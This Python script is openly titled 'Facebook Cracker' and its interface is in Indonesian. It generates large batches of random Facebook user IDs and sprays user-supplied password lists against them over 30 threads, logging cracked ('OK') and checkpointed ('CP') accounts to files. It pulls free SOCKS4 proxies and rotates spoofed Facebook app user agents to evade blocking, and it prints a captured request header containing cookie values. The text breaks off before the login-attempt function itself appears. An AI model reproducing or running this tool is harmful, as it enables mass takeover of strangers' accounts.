G = '\033[92;1m'
Y = '\033[93;1m'

Z = "\x1b[0;90m"     # Hitam new warna
M = "\x1b[38;5;196m" # Merah new warna
H = "\x1b[38;5;46m"  # Hijau new warna
K = "\x1b[38;5;226m" # Kuning new warna
B = "\x1b[38;5;44m"  # Biru new warna
U = "\x1b[0;95m"     # Ungu new warna
O = "\x1b[0;96m"     # Biru Muda new warna
N = "\x1b[0;96m"     # Biru Muda new warna
P = "\x1b[38;5;231m" # Putih  new warna
J = "\x1b[38;5;208m" # Jingga new warna
A = "\x1b[38;5;248m" # Abu-Abu new warna

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
from bs4 import BeautifulSoup as sop 
from bs4 import BeautifulSoup as parsel
from concurrent.futures import ThreadPoolExecutor as tred

#try:rua2 = open('user-agents.txt','r').read().splitlines()
rua2 =["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
	"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
	"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
	"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]",
	"Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]",
	"Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]",
    "Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser"]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('GAGAL')
prox=open('.prox.txt','r').read().splitlines()

# INDICATION
id,id2,loop,akun,method,tokenku,uid= [],[],0,[],[],[],[]
cp = 0
ok = []
# Converter 
dik = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
#dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dik[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
###Save Hasil Crack 2009-2010
okez2009_10 = '2009-10 OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cepez2009_10 = '2009-10 CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
####Save Hasil Crack 2008-2009
okez2008_09 = '2009-10 OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cepez2008_09 = '2009-10 CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
####Save Hasil Crack 2007-2008
okez2007_08 = '2007-08 OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cepez2007_08 = '2007-08 CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
####Save Hasil Crack 2006-2007
okez2006_07 = '2006-07 OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cepez2006_07 = '2006-07 CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
####Save Hasil Crack 2005-2006
okez2005_06 = '2005-06 OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cepez2005_06 = '2005-06 CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
####Save Hasil Crack 2004-2005
okez2004_05 = '2004-05 OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cepez2004_05 = '2004-05 CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
####Save Hasil Crack 2004-2022
okez2004_22 = '2004-22 OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cepez2004_22 = '2004-22 CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
	os.system('clear')
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def jalanin_aja(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.06)
############### #LOGO############## ## 

def Bangsat():
	print(f"""{H} ☄{P}【{K}Facebook Cracker {P}<─> {H}@By Hikmat{P}】
 {P}_______ _______ {M}_______ {H}_______ _     _
 {P}|______ |_____| {M}|       {H}|______  \___/ 
 {P}|       |     | {M}|_____  {H}|______ _/   \_
                                        """)
def BangsatV2():
	print(f"""{M} ☄{P}【{K}Facebook Cracker {P}<─> {H}@By Hikmat{P}】
 _________   __________  .____     
\_   ___ \  \______   \ |    |    
/    \  \/   |       _/ |    |    
\     \____  |    |   \ |    |___ 
 \______  /  |____|_  / |_______ \
\n        \/          \/          \/

""")

def BangGipAlok():
	####Data Datamu Cuy####
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	####
	except:EwePaksa = {'-'}
	####
	try:IP = EwePaksa["query"]
	####
	except:IP = {'-'}
	####
	try:nibba = EwePaksa["country"]
	####
	except:nibba = {'-'}
	####
	try:rasis_Z_K_= EwePaksa["isp"]
	####
	except:rasis_Z_K_ = {'-'}
	####
	try:rasis_Z_K_X_= EwePaksa["city"]
	####
	except:rasis_Z_K_X_ = {'-'}
	####
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	####
	except:rasis_Z_K_X_R_ = {'-'}
	####
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	####
	except:rasis_Z_K_X_R_H_ = {'-'}
	####
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	####
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	####
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	####
	print(f'{P} Data Android Kamu\n');print('%s Ipaddress      :%s %s'%(P,H,IP));print('%s Country        :%s %s'%(P,H,nibba));print('%s Sim Card       :%s %s'%(P,H,rasis_Z_K_));print('%s City           :%s %s'%(P,H,rasis_Z_K_X_));print('%s Timezone       :%s %s'%(P,H,rasis_Z_K_X_R_));print(' %sCountry Code   :%s %s'%(P,H,rasis_Z_K_X_R_H_));print('%s Region         :%s %s'%(P,H,rasis_Z_K_X_R_H_M_));print('%s Sim Card 2     :%s %s'%(P,H,rasis_Z_K_X_R_H_M_P_))
	print('%s Waktu Sekarang :%s %s\n'%(P,H,datetime.datetime.now().strftime('%H:%M:%S')))
	
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.bangsat_mkv = []
		self.loop = 0
		os.system("clear")
		BangsatV2()
		BangGipAlok()
		print("%s [%s1%s] 2009-10 + Cloning + methode full"%(P,H,P))
		print("%s [%s2%s] 2008-09 + Cloning + methode full"%(P,H,P))
		print("%s [%s3%s] 2007-08 + Cloning + methode full"%(P,H,P))
		print("%s [%s4%s] 2006-07 + Cloning + methode full"%(P,H,P))
		print("%s [%s5%s] 2005-06 + Cloning + methode full"%(P,H,P))
		print("%s [%s6%s] 2004-05 + Cloning + methode full"%(P,H,P))
		print("%s [%s7%s] 2004-22 + Cloning + methode full"%(P,H,P))
		print("%s [%s8%s] 2010-14 + Cloning + methode full"%(P,H,P))
		print("%s [%s9%s] Header full update + user agent web"%(P,H,P))
		#print(" [5] 2011-14 Cloning")
		#print(" [E] Exit Programming\n")
		Mat =input(f" {P}Pilih :{H} ")
		if Mat in ["1", "01"]:
			self.pilihmetod()
			#self.old_basic()
		if Mat in ["2", "02"]:
			self.pilihmetod2()
		if Mat in ["3", "03"]:
			self.pilihmetod3()
		if Mat in ["4", "04"]:
			self.pilihmetod4()
		if Mat in ["5", "05"]:
			self.pilihmetod5()
		if Mat in ["6", "06"]:
			self.pilihmetod6()
		if Mat in ["7", "07"]:
			self.pilihmetod7()
		if Mat in ["8", "08"]:
			self.pilmetod()
		if Mat in ["9", "09"]:
			self.head_usergen()
		else:
			print("%s Isi yang benar"%(P))
			time.sleep(1)
			Main()
			
	def head_usergen(self):
		print("")
		print(f" {P}[{H}√{P}] User agent web + header terupdate")
		print(f" {P}[{H}1{P}] Cari user agent dari web langsung")
		print(f" {P}[{H}2{P}] Header new terupdate no login tinggal salin")
		trumps = input(f" {P} Pilih :{H} ")
		if trumps in ["1"]:
			self.websus()
		elif trumps in ["2"]:
			self.head_new()
		else:
			print(f" {H}Isi Yang benar")
			self.head_usergen()
			
	def head_new(self):
		print("")
		jalanin_aja(f" {P}[{H}..{P}] Sedang Mengambil Header")
		jalan(f" {P}[{H}√{P}] Sukses Mengambil Header")
		jalan(f" {P}[{H}√{P}] Total Ada {H} 1 {P} Header Terupdate")
		print(f" {P}[{H}√{P}] Header Methode {H}Mbasic")
		jalanin_aja(' %s[%s1%s] %s√ %sUser Agent : Host: mbasic.facebook.com\nsec-ch-ua: "Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"\nsec-ch-ua-mobile: ?1\nsec-ch-ua-platform: "Android"\nupgrade-insecure-requests: \nuser-agent: Mozilla/5.0 (Linux; Android 5.1; vivo Y21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nsec-fetch-site: none\nsec-fetch-mode: navigate\nsec-fetch-user: ?1\nsec-fetch-dest: document\naccept-encoding: gzip, deflate, br\naccept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\ncookie: sb=DUF_YgGHnqbuElsNb2GnCwwA\ncookie: datr=D0F_YiifrGchuoT-aW7q5BLH\ncookie: m_pixel_ratio=1.5\ncookie: wd=320x472\ncookie: fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8\n'%(P,H,P,H,P))
		jalan(f" {P}[{H}√{P}] Selesai Mengambil Header Terupdate")
		input(f" {P}[{H}•{P}] Enter To Menu")
		Main()
	
	def websus(self):
		print("")
		jalanin_aja(f" {P}[{H}..{P}] Sedang Mengambil User Agent")
		jalan(f" {P}[{H}√{P}] Sukses Mengambil User Agent")
		jalan(f" {P}[{H}√{P}] Total Ada {H} 12 {P} User Agent")
		jalanin_aja(" %s[%s1%s] %s√ %sUser Agent : Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s2%s] %s√ %sUser Agent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s3%s] %s√ %sUser Agent : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s4%s] %s√ %sUser Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s5%s] %s√ %sUser Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s6%s] %s√ %sUser Agent : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s7%s] %s√ %sUser Agent : Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s8%s] %s√ %sUser Agent : Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s9%s] %s√ %sUser Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s10%s] %s√ %sUser Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s11%s] %s√ %sUser Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\n"%(P,H,P,H,P))
		jalanin_aja(" %s[%s12%s] %s√ %sUser Agent : Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\n"%(P,H,P,H,P))
		jalan(f" {P}[{H}√{P}] Selesai Mengambil User Agent")
		input(f" {P}[{H}•{P}] Enter To Menu")
		Main()
				
	
	def pilihmetod4(self):
		print("")
		print("%s [1] 2006-07 + Cloning + methode mbasic"%(P))
		print(" %s[2] 2006-07 + Cloning + methode bapi"%(P))
		print("%s [3] 2006-07 + Cloning + methode free"%(P))
		print(" %s[4] 2006-07 + Cloning + methode touch"%(P))
		print("%s [5] 2006-07 + Cloning + methode mobile"%(P))
		print(" %s[6] 2006-07 + Cloning + methode IPhone"%(P))
		print("%s [7] 2006-07 + Cloning + methode x facebook"%(P))
		print(" %s[8] 2006-07 + Cloning + methode graph [ %sTidak Ada Pembaruan %s]"%(P,M,P))
		Mat =input(" %sChoose : "%(P))
		if Mat in ["1", "01"]:
			self.old_basic4()
		if Mat in ["2", "02"]:
			self.old_bapi4()
		if Mat in ["3", "03"]:
			self.old_free4()
		if Mat in ["4", "04"]:
			self.old_touch4()
		if Mat in ["5", "05"]:
			self.old_mobile4()
		if Mat in ["6", "06"]:
			self.old_iphone4()
		if Mat in ["7", "07"]:
			self.old_xfacebook4()
		if Mat in ["8", "08"]:
			self.old_graph()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			pilihmetod3()
	
	def old_xfacebook4(self):
		print("")
		print(f"{P} [{H}1{P}] Cloning Id Running (1)94xxx")
		print(f"{P} [{H}2{P}] Cloning Id Running (2)94xxx")
		print(f"{P} [{H}3{P}] Cloning Id Running (3)94xxx")
		print(f"{P} [{H}4{P}] Cloning Id Running (4)94xxx")
		print(f"{P} [{H}5{P}] Cloning Id Running (5)94xxx")
		print(f"{P} [{H}6{P}] Cloning Id Running (6)94xxx")
		print(f"{P} [{H}7{P}] Cloning Id Running (7)94xxx")
		print(f"{P} [{H}8{P}] Cloning Id Running (8)94xxx")
		print(f"{P} [{H}9{P}] Cloning Id Running (9)94xxx")
		print(f"{P} [{H}10{P}] Cloning Id Running Random Id")
		Runn = input(f"{P} Pilih : ")
		if Runn in ["1"]:
			self.runzzzz198()
		elif Runn in ["2"]:
			self.runzzzz298()
		elif Runn in ["3"]:
			self.runzzzz398()
		elif Runn in ["4"]:
			self.runzzzz498()
		elif Runn in ["5"]:
			self.runzzzz598()
		elif Runn in ["6"]:
			self.runzzz698()
		elif Runn in ["7"]:
			self.runzzzz798()
		elif Runn in ["8"]:
			self.runzzzz898()
		elif Runn in ["9"]:
			self.runzzzz998()
		elif Runn in ["10"]:
			self.runzzzzRandomly()
		else:
			print(f" {P} Isi Yang Benar") 
			self.old_basic4()
			
	def runzzzzRandomly(self):
		x = 111111111
		xx = 999999999
		idx = "1"
		x2 = 111111111
		xx2 = 999999999
		idx2 = "2"
		x3 = 111111111
		xx3 = 999999999
		idx3 = "3"
		x4 = 111111111
		xx4 = 999999999
		idx4 = "4"
		x5 = 111111111
		xx5 = 999999999
		idx5 = "5"
		x6 = 111111111
		xx6 = 999999999
		idx6 = "6"
		x7 = 111111111
		xx7 = 999999999
		idx7 = "7"
		x8 = 111111111
		xx8 = 999999999
		idx8 = "8"
		x9 = 111111111
		xx9 = 999999999
		idx9 = "9"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_)), 
				_ = random.randint(x2,xx2)
				__ = idx2
				self.id.append(__+str(_)), 
				_ = random.randint(x3,xx3)
				__ = idx3
				self.id.append(__+str(_))
				_ = random.randint(x4,xx4)
				__ = idx4
				self.id.append(__+str(_)), 
				_ = random.randint(x5,xx5)
				__ = idx5
				self.id.append(__+str(_)), 
				_ = random.randint(x6,xx6)
				__ = idx6
				self.id.append(__+str(_)), 
				_ = random.randint(x7,xx7)
				__ = idx7
				self.id.append(__+str(_)), 
				_ = random.randint(x8,xx8)
				__ = idx8
				self.id.append(__+str(_)), 
				_ = random.randint(x9,xx9)
				__ = idx9
				self.id.append(__+str(_))
				random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz198(self):
		x = 111111111
		xx = 999999999
		idx = "1"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz998(self):
		x = 111111111
		xx = 999999999
		idx = "9"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz898(self):
		x = 111111111
		xx = 999999999
		idx = "8"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz798(self):
		x = 111111111
		xx = 999999999
		idx = "7"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali") 
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz698(self):
		x = 111111111
		xx = 999999999
		idx = "6"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz598(self):
		x = 111111111
		xx = 999999999
		idx = "5"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz498(self):
		x = 111111111
		xx = 999999999
		idx = "4"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
